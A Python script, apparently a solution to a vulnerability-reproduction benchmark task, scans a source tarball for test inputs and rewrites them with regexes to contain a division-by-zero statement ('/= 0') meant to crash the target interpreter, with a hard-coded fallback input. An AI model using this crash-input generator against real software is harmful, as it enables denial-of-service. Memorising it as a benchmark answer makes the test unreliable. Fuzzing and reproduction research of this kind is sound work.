import os
import tarfile
import re
import string


class Solution:
    def solve(self, src_path: str) -> bytes:
        def is_probably_text(raw: bytes) -> bool:
            if not raw:
                return False
            sample = raw[:1000]
            if b"\x00" in sample:
                return False
            printable = set(bytes(string.printable, "ascii"))
            nontext = sum(1 for b in sample if b not in printable)
            return nontext <= 0.3 * len(sample)

        def collect_candidate_inputs(tar_path: str):
            input_exts = {
                ".txt",
                ".in",
                ".input",
                ".dat",
                ".data",
                ".prog",
                ".src",
                ".code",
                ".script",
                ".test",
                ".t",
                ".lang",
                ".conf",
                ".cfg",
                ".sample",
                ".example",
                ".poc",
                ".case",
            }
            keywords = [
                "test",
                "tests",
                "input",
                "inputs",
                "case",
                "cases",
                "example",
                "examples",
                "sample",
                "samples",
                "poc",
                "repro",
                "fuzz",
                "crash",
            ]
            max_size = 4096
            candidates = []
            with tarfile.open(tar_path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    if member.size == 0 or member.size > max_size:
                        continue
                    lower_name = member.name.lower()
                    ext = os.path.splitext(lower_name)[1]
                    likely = False
                    if any(kw in lower_name for kw in keywords):
                        likely = True
                    if ext in input_exts:
                        likely = True
                    if not likely:
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    raw = f.read()
                    if not raw:
                        continue
                    if not is_probably_text(raw):
                        continue
                    text = raw.decode("utf-8", errors="ignore")
                    if text:
                        candidates.append((member.name, text))
            return candidates

        def try_build_from_candidates(candidate_inputs):
            # Step 1: existing "/= 0"
            pattern_zero = re.compile(r"/=\s*0\b")
            for path, text in candidate_inputs:
                if pattern_zero.search(text):
                    return text.encode("utf-8", errors="ignore")

            # Step 2: "/= <nonzero int>"
            pattern_const = re.compile(r"(/=\s*)(-?\d+)(\b)")
            for path, text in candidate_inputs:
                m = pattern_const.search(text)
                if m and m.group(2) != "0":
                    new_text = text[: m.start(2)] + "0" + text[m.end(2) :]
                    return new_text.encode("utf-8", errors="ignore")

            # Step 3: generic "/= expr" -> make "/= 0"
            pattern_div_expr = re.compile(r"/=\s*[^;\n]+")
            for path, text in candidate_inputs:
                m = pattern_div_expr.search(text)
                if m:
                    new_text = text[: m.start()] + "/= 0" + text[m.end() :]
                    return new_text.encode("utf-8", errors="ignore")

            # Step 4: transform other compound ops (+=, -=, *=) to "/= 0"
            comp_ops = ["+=", "-=", "*="]
            patterns = {
                op: re.compile(re.escape(op) + r"\s*[^;\n]+") for op in comp_ops
            }
            for path, text in candidate_inputs:
                for op, pat in patterns.items():
                    m = pat.search(text)
                    if m:
                        new_text = text[: m.start()] + "/= 0" + text[m.end() :]
                        return new_text.encode("utf-8", errors="ignore")

            # Step 5: append a new "/= 0" statement using existing variable
            for path, text in candidate_inputs:
                m = re.search(r"\b([A-Za-z_]\w*)\s*=", text)
                if m:
                    var_name = m.group(1)
                    poc = text
                    if not poc.endswith("\n"):
                        poc += "\n"
                    use_semicolon = ";" in text
                    poc += f"{var_name} /= 0"
                    if use_semicolon:
                        poc += ";"
                    poc += "\n"
                    return poc.encode("utf-8", errors="ignore")

            return None

        # Main solve logic
        candidate_inputs = collect_candidate_inputs(src_path)
        if candidate_inputs:
            poc = try_build_from_candidates(candidate_inputs)
            if poc is not None:
                return poc

        # Fallback: generic guess; may still work for simple languages
        fallback = "x = 1;\nx /= 0;\n"
        return fallback.encode("utf-8", errors="ignore")